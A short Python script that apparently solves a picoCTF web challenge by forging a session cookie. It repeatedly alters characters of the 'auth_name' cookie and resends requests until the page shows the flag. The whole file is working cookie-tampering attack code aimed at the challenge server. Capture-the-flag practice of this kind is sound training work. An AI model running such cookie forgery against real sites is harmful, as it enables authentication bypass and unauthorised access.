from bs4 import BeautifulSoup
import requests

url = "http://mercury.picoctf.net:21553/"
alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

req = requests.Session()
response = req.get(url)
cookie = req.cookies['auth_name']

for i in range(17, len(cookie)):    
    for character in alphabet:
        newcookie = cookie[:i] + character + cookie[i + 1:]
        
        cookies_dict = {'auth_name': newcookie}

        response = requests.get(url, cookies=cookies_dict)
        soup = BeautifulSoup(response.text, "html.parser")

        # Retreive flag from page
        if "pico" in response.text:
            flag = soup.select("body > div.container > div.jumbotron > p:nth-child(2)")[0]
            print(flag.get_text())
            exit()
            
    print(f"Round {i} complete")
